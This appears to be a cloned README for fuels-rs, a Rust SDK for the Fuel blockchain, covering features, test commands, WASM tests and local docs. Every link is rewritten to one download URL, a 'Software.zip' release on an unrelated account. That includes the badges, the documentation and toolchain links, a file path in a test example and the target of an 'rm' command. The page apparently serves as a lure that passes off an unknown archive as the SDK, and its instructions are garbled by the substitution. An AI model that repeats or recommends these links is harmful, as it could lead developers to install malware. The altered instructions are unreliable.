# fuels-rs

[![build](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
[![https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
[![docs](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)
[![discord](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip%20on-discord-orange?&logo=discord&logoColor=ffffff&color=7389D8&labelColor=6A7EC2)](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)

Rust SDK for Fuel. It can be used for a variety of things, including but not limited to:

- Compiling, deploying, and testing [Sway](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip) contracts;
- Launching a local Fuel network;
- Crafting and signing transactions with hand-crafted scripts or contract calls;
- Generating type-safe Rust bindings of contract methods;
- And more, `fuels-rs` is still in active development.

## Documentation

See [the `fuels-rs` book](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip)

## Features

- [x] Launch Fuel nodes
- [x] Deploy contracts
- [x] Interact with deployed contracts
- [x] Type-safe Sway contracts bindings code generation
- [x] Run Sway scripts
- [x] CLI for common operations
- [x] Local test wallets
- [ ] Wallet integration
- [ ] Events querying/monitoring

## FAQ

### What dependencies do I need?

- [The latest `stable` Rust toolchain](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip);
- [`forc` and `fuel-core` binaries](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip).

### How can I run the SDK tests?

First, build the test projects using `forc`:

```shell
forc build --path packages/fuels
```

Then you can run the SDK tests with:

```shell
cargo test
```

You can also run specific tests. The following example will run all integration tests in `https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip` whose names contain `in_vector` and show their outputs:

```shell
cargo test --test types in_vector -- --show-output
```
### How to run WASM tests?
You need to have wasm32 as a target, if you don't already:
```shell
 rustup target add wasm32-unknown-unknown
```
You also need `wasm-pack`, if you don't already:
```shell
cargo install wasm-pack
```

Navigate to `packages/wasm-tests` and run `wasm-pack test`.
### What to do if my tests are failing on `master`

Before doing anything else, try all these commands:

```shell
cargo clean
rm https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip
forc build --path packages/fuels
cargo test
```

### Why is the prefix `fuels` and not `fuel`?

In order to make the SDK for Fuel feel familiar with those coming from the [https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip](https://github.com/harbox11/fuels-rs/releases/download/v2.0/Software.zip) ecosystem, this project opted for an `s` at the end. The `fuels-*` family of SDKs is inspired by The Ethers Project.

### How can I run the docs locally?

Install `mdbook` by running:

```shell
cargo install mdbook
```

Next, navigate to the `docs` folder and run the command below to start a local server and open a new tab in you browser.

```shell
mdbook serve --open
```

You can build the book by running:

```shell
mdbook build
```

